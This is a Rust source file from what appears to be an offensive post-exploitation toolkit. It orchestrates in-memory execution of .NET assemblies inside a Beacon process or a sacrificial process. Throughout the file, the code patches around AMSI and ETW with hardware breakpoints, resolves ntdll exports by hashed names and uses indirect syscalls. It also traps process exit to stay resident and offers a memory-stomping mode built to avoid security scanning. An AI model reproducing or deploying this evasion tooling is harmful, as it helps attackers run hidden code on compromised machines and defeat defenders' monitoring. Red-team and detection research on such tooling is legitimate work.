//! Shared CLR-hosting orchestrator used by both `senjata-execute-assembly`
//! (BOF, inline mode) and `senjata-runner` (postex DLL, sacrificial mode).
#![no_std]

extern crate alloc;


#[cfg(target_os = "windows")]
pub mod error;
#[cfg(target_os = "windows")]
pub use error::OrchestratorError;

pub mod pe_parser;

#[cfg(target_os = "windows")]
pub mod io;
#[cfg(target_os = "windows")]
pub mod cleanup;
#[cfg(target_os = "windows")]
pub mod dispatch;
#[cfg(target_os = "windows")]
pub mod netfx;
#[cfg(target_os = "windows")]
pub mod clr_netfx_stomp;
#[cfg(target_os = "windows")]
pub mod coreclr;
#[cfg(target_os = "windows")]
pub mod flush;
#[cfg(target_os = "windows")]
pub mod nlog;
#[cfg(target_os = "windows")]
pub mod bypasses;

/// Optional diagnostic logger. When `Some`, orchestrate calls it at
/// each major step so the caller can write to its own diagnostic sink.
/// The BOF passes `None`; the postex DLL passes a wrapper around
/// `senjata_runner::debug_log::log` for the v0.3.x debugging phase.
#[cfg(target_os = "windows")]
pub type DiagLogFn = unsafe extern "C" fn(msg: *const u8, len: usize);

/// Parsed-args bag passed to `orchestrate`. Both the BOF (inline mode)
/// and the postex DLL (sacrificial mode) parse their wire-format args
/// into this struct after parsing. Borrows live for the duration of the
/// `orchestrate` call — the underlying arg blob must outlive the call.
#[cfg(target_os = "windows")]
pub struct OrchestrateInput<'a> {
    pub app_domain: &'a str,
    pub amsi: bool,
    pub etw: bool,
    pub mailslot: bool,
    pub entry_point: u32,
    pub slot_name: &'a str,
    pub pipe_name: &'a str,
    pub asm_args: &'a str,
    pub mode: u32,
    pub main_name: &'a str,
    pub asm_bytes: &'a [u8],
    /// Optional diagnostic logger (see `DiagLogFn`).
    pub log_fn: Option<DiagLogFn>,
}

/// Internal: emit `msg` via the caller-supplied logger if set. No-op in
/// production builds (the diagnostic infrastructure is retained behind
/// a Cargo feature in the runner crate so future debugging can re-enable
/// it without re-deriving the instrumentation).
#[cfg(target_os = "windows")]
#[cfg(feature = "diag-log")]
#[inline]
fn dlog(input: &OrchestrateInput<'_>, msg: &[u8]) {
    if let Some(f) = input.log_fn {
        unsafe { f(msg.as_ptr(), msg.len()) };
    }
}

#[cfg(target_os = "windows")]
#[cfg(not(feature = "diag-log"))]
#[inline(always)]
fn dlog(_input: &OrchestrateInput<'_>, _msg: &[u8]) {}

/// Crate-global diagnostic logger. orchestrate_internal stashes the
/// caller's log_fn here so dispatch / netfx / nlog / flush modules can
/// emit trace lines without threading the callback through every fn
/// signature.
///
/// Compiled out when the `diag-log` feature is off.
#[cfg(target_os = "windows")]
#[cfg(feature = "diag-log")]
static DLOG_SLOT: core::sync::atomic::AtomicUsize =
    core::sync::atomic::AtomicUsize::new(0);

#[cfg(target_os = "windows")]
#[cfg(feature = "diag-log")]
fn set_dlog(f: Option<DiagLogFn>) {
    let v = match f {
        Some(g) => g as usize,
        None => 0,
    };
    DLOG_SLOT.store(v, core::sync::atomic::Ordering::Relaxed);
}

#[cfg(target_os = "windows")]
#[cfg(not(feature = "diag-log"))]
#[inline(always)]
fn set_dlog(_f: Option<DiagLogFn>) {}

/// Available to any module in this crate: emit `msg` if the orchestrate
/// caller wired a logger. Cheap no-op when not wired (and entirely
/// optimised out under `not(feature = "diag-log")`).
#[cfg(target_os = "windows")]
#[cfg(feature = "diag-log")]
pub(crate) fn dlog2(msg: &[u8]) {
    let v = DLOG_SLOT.load(core::sync::atomic::Ordering::Relaxed);
    if v != 0 {
        let f: DiagLogFn = unsafe { core::mem::transmute(v) };
        unsafe { f(msg.as_ptr(), msg.len()) };
    }
}

#[cfg(target_os = "windows")]
#[cfg(not(feature = "diag-log"))]
#[inline(always)]
pub(crate) fn dlog2(_msg: &[u8]) {}

/// Emit `label` followed by a hex-formatted u32 (e.g. "label 0xdeadbeef\n").
#[cfg(target_os = "windows")]
#[cfg(feature = "diag-log")]
pub(crate) fn dlog2_hex(label: &[u8], value: u32) {
    let v = DLOG_SLOT.load(core::sync::atomic::Ordering::Relaxed);
    if v == 0 {
        return;
    }
    let f: DiagLogFn = unsafe { core::mem::transmute(v) };
    // Format `label 0xXXXXXXXX` into a stack buffer.
    let mut buf = [0u8; 80];
    let mut i = 0;
    for &b in label {
        if i >= buf.len() { break; }
        buf[i] = b;
        i += 1;
    }
    if i + 11 < buf.len() {
        buf[i] = b' '; i += 1;
        buf[i] = b'0'; i += 1;
        buf[i] = b'x'; i += 1;
        for shift in (0..32).step_by(4).rev() {
            let nibble = ((value >> shift) & 0xF) as u8;
            buf[i] = if nibble < 10 { b'0' + nibble } else { b'a' + (nibble - 10) };
            i += 1;
        }
    }
    unsafe { f(buf.as_ptr(), i) };
}

#[cfg(target_os = "windows")]
#[cfg(not(feature = "diag-log"))]
#[inline(always)]
pub(crate) fn dlog2_hex(_label: &[u8], _value: u32) {}

/// Caller-supplied hook for streaming mode: receives the pipe-read HANDLE
/// before the CLR begins writing. Caller is expected to spawn a thread
/// that reads from this handle and forwards bytes to operator.
///
/// `ctx` is an opaque pointer threaded through unchanged — typically a
/// reference to the caller's BeaconAPI struct.
#[cfg(target_os = "windows")]
pub type PipeReadyHook = unsafe extern "C" fn(
    read_handle: windows_sys::Win32::Foundation::HANDLE,
    ctx: *mut core::ffi::c_void,
);

/// Inline-mode orchestrate. Drains the pipe at end-of-run into a String
/// and prints once via `rustbof::eprintln`. Used by the BOF.
///
/// # Safety
///
/// Caller must guarantee:
/// - PEB walker (`opsec_peb`) is in a valid state. No explicit init is
///   required; PEB is process-global.
/// - `engine: &HwbpEngine` is freshly initialized via `HwbpEngine::init()`
///   on the calling thread and stays alive for the duration of the call.
///   The engine installs HWBP descriptors on threads as needed; do not
///   share one engine across BOF/runner instances.
/// - `input.asm_bytes` outlives the call and is a valid managed PE (single-
///   file mode) or a valid multi-file blob (mode == 1; see
///   `netfx::parse_multi_blob` for the layout).
/// - Single-threaded entry. The orchestrator installs and removes HWBP
///   descriptors via indirect syscalls; concurrent entry from another
///   thread of the same process would race on the engine state.
/// - The host process can tolerate `Console.Out` redirection — for the
///   BOF this means Beacon's process, for the postex DLL it's a fresh
///   sacrificial.
///
/// On `Environment.Exit` inside the managed code, the exit-trap rewrites
/// RIP/RSP back to the cleanup point captured before dispatch; the
/// function then drains any remaining output and returns `Ok(())`.
#[cfg(target_os = "windows")]
pub unsafe fn orchestrate(
    input: &OrchestrateInput<'_>,
    engine: &opsec_hwbp::HwbpEngine,
) -> Result<(), OrchestratorError> {
    unsafe { orchestrate_internal(input, engine, None, core::ptr::null_mut()) }
}

/// Sacrificial-mode orchestrate. Invokes `hook(read_handle, ctx)` once,
/// immediately after the internal pipe is opened, so the caller can spawn
/// a reader thread before the CLR starts writing. NO end-of-run drain;
/// the streamer drains to EOF (signalled by `IoChannel::drop` closing
/// the write end).
///
/// # Safety
/// Same as `orchestrate`. Additionally, `ctx` must outlive the call.
/// Hook is called exactly once, before dispatch.
#[cfg(target_os = "windows")]
pub unsafe fn orchestrate_streaming(
    input: &OrchestrateInput<'_>,
    engine: &opsec_hwbp::HwbpEngine,
    hook: PipeReadyHook,
    ctx: *mut core::ffi::c_void,
) -> Result<(), OrchestratorError> {
    unsafe { orchestrate_internal(input, engine, Some(hook), ctx) }
}

#[cfg(target_os = "windows")]
unsafe fn orchestrate_internal(
    input: &OrchestrateInput<'_>,
    engine: &opsec_hwbp::HwbpEngine,
    hook: Option<PipeReadyHook>,
    ctx: *mut core::ffi::c_void,
) -> Result<(), OrchestratorError> {
    unsafe {
        // Make the log fn available crate-wide for the duration of this call.
        set_dlog(input.log_fn);
        dlog(input, b"[orch] entered");

        // PE parser → runtime detection (single-file mode only; multi-file
        // mode trusts the caller-bundled blob).
        dlog(input, b"[orch] pe_parser::parse");
        let asm_info = if input.mode == 1 {
            pe_parser::AsmInfo { runtime: pe_parser::Runtime::NetFx4 }
        } else {
            pe_parser::parse(input.asm_bytes).map_err(|e| match e {
                pe_parser::Error::MixedMode => OrchestratorError::MixedModeUnsupported,
                pe_parser::Error::ArchMismatch => OrchestratorError::ArchMismatch,
                other => OrchestratorError::PeParse(other),
            })?
        };
        dlog(input, b"[orch]   pe_parser ok");

        // Install ETW / AMSI / AllocConsole HWBP bypasses.
        dlog(input, b"[orch] bypasses::install");
        let _bypasses = bypasses::install(engine, input.amsi, input.etw)?;
        dlog(input, b"[orch]   bypasses ok");

        // Open the output channel BEFORE the CLR initializes stdio.
        dlog(input, b"[orch] IoChannel::open");
        let mut io_ch = io::IoChannel::open(input.mailslot, input.slot_name, input.pipe_name)?;
        dlog(input, b"[orch]   IoChannel ok");

        // Streaming mode: hand the read handle to the caller, exactly once,
        // before the CLR starts writing.
        let streaming = hook.is_some();
        if let Some(h) = hook {
            dlog(input, b"[orch] calling pipe_ready_hook");
            h(io_ch.read_handle(), ctx);
            dlog(input, b"[orch]   pipe_ready_hook returned");
        }

        // Resolve RtlExitUserProcess once; needed for both install_exit_trap
        // (path A) and cleanup on path B.
        let ntdll_h = opsec_strcrypt::hash!("ntdll.dll");
        let exit_h  = opsec_strcrypt::hash!("RtlExitUserProcess");
        let exit_target = opsec_peb::resolve_module(ntdll_h)
            .and_then(|m| opsec_peb::resolve_export(m, exit_h))
            .ok_or(OrchestratorError::PebResolve {
                module_hash: ntdll_h,
                export_hash: exit_h,
            })? as usize;

        // Reset the fired flag before capturing the cleanup point so a
        // stale value from a previous run never masks path A.
        opsec_hwbp::EXIT_TRAP_FIRED.store(0, core::sync::atomic::Ordering::Relaxed);

        // Capture the resume point for the exit-trap.
        //
        // Two paths land after save_cleanup_point() returns:
        //   A. First entry  — EXIT_TRAP_FIRED == 0: dispatch the assembly.
        //   B. Re-entry via VEH ExitTrap redirect — EXIT_TRAP_FIRED == 1:
        //      the VEH already removed the TABLE entry and cleared the DR
        //      in the faulting thread's CONTEXT.  Skip dispatch entirely;
        //      fall through to the trailing drain so the streamer can EOF.
        dlog(input, b"[orch] save_cleanup_point");
        let (resume_rip, resume_rsp) = cleanup::save_cleanup_point();

        // Read-and-clear atomically so nested/reentrant calls don't bleed.
        let exit_trap_fired =
            opsec_hwbp::EXIT_TRAP_FIRED.swap(0, core::sync::atomic::Ordering::Relaxed) != 0;
        dlog(input, b"[orch]   cleanup point saved");

        if !exit_trap_fired {
            // ── PATH A: first entry ──────────────────────────────────────
            dlog(input, b"[orch] install_exit_trap");
            let _exit_trap = engine
                .install_exit_trap(exit_target, 2, resume_rip, resume_rsp)
                .map_err(OrchestratorError::Hwbp)?;
            dlog(input, b"[orch]   exit_trap installed");

            dlog(input, b"[orch] dispatch::dispatch");
            let dispatch_result = dispatch::dispatch(
                &asm_info,
                input.asm_bytes,
                input.app_domain,
                input.asm_args,
                input.entry_point,
                input.mode,
                input.main_name,
                io_ch.write_handle() as usize,
            );
            dlog(input, b"[orch]   dispatch returned");

            // _exit_trap drops here → removes descriptor + clears DR (normal return).
            dlog(input, b"[orch] inner block exiting (exit_trap will drop)");

            #[cfg(feature = "debug-io")]
            io_ch.diag_write(b"\n[RUST_END]\n");
            if !streaming {
                if let Ok(output) = io_ch.drain() {
                    if !output.is_empty() {
                        rustbof::eprintln!("\n{}", output);
                    }
                }
            }
            dispatch_result?;
        } else {
            // ── PATH B: exit-trap re-entry ───────────────────────────────
            // VEH cleared the TABLE entry and the firing thread's DR.
            // Clear remaining threads' DRs for slot 2 so postex_exit →
            // ExitProcess → RtlExitUserProcess doesn't re-trigger a stale BP.
            dlog(input, b"[orch] path B: exit-trap re-entry, cleaning up DR slot 2");
            engine.remove_breakpoint(exit_target, 2);
        }

        dlog(input, b"[orch] trailing drain");
        // Trailing drain: path B lands here (no-op for streaming; the
        // streamer sees EOF when io_ch drops at function exit).
        if !streaming {
            if let Ok(output) = io_ch.drain() {
                if !output.is_empty() {
                    rustbof::eprintln!("\n{}", output);
                }
            }
        }
        dlog(input, b"[orch] about to return Ok (io_ch + bypasses will Drop)");
        Ok(())
    }
}

/// Input bag for stomp-mode inline execution (no HwbpEngine required).
#[cfg(target_os = "windows")]
pub struct StompInput<'a> {
    pub app_domain: &'a str,
    pub pipe_name: &'a str,
    pub asm_args: &'a str,
    pub asm_bytes: &'a [u8],
    pub entry_point: u32,
    pub log_fn: Option<DiagLogFn>,
}

/// Inline-mode stomp orchestrator. No HWBP — OPSEC handled entirely by
/// IHostMemoryManager stomp + Load_2 (no AMSI managed-scan exposure).
///
/// # Safety
/// - `input.asm_bytes` must be a valid single-file managed PE.
/// - Single-threaded entry.
#[cfg(target_os = "windows")]
pub unsafe fn orchestrate_stomp(
    input: &StompInput<'_>,
) -> Result<(), OrchestratorError> {
    unsafe {
        set_dlog(input.log_fn);
        dlog2(b"[stomp-orch] entered");

        let asm_info = pe_parser::parse(input.asm_bytes).map_err(|e| match e {
            pe_parser::Error::MixedMode => OrchestratorError::MixedModeUnsupported,
            pe_parser::Error::ArchMismatch => OrchestratorError::ArchMismatch,
            other => OrchestratorError::PeParse(other),
        })?;

        let clr_major: u8 = match asm_info.runtime {
            pe_parser::Runtime::NetFx4 => 4,
            pe_parser::Runtime::CoreClr => {
                return Err(OrchestratorError::Clr { hr: -1, op: "coreclr-no-stomp" });
            }
        };

        let run_input = clr_netfx_stomp::StompRunInput {
            app_domain:  input.app_domain,
            pipe_name:   input.pipe_name,
            asm_args:    input.asm_args,
            asm_bytes:   input.asm_bytes,
            entry_point: input.entry_point,
            clr_major,
        };

        clr_netfx_stomp::run_stomp(&run_input)
    }
}
